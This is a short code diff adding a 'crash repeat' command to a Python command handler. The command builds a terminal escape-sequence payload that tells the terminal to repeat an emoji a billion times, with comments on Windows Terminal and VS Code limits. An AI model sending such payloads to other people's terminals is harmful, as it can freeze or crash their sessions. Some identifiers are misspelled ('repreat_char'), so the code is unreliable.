@@ -291,6 +291,18 @@ def handle_command(command: str, stack: list[tuple[str, int]] = []):
 
     elif command.startswith("echo "):
         print(command.removeprefix("echo "))
+    
+    elif command.startswith("crash "):
+        split = command.split()
+
+        if split[1] == "repeat":
+            # uses the "repeat previous grapthics character" CSI sequence to spam 1 billion emojis
+            # widnows terminal limits to 65536, vscode to 32767
+            sequence = '✌'.encode() + formatting.repreat_char(1000000000)
+            current_payload = payload.RawPayload(sequence)
+            
+        else:
+            return "Unknown crash mode!"
 
     elif command == "": pass
 
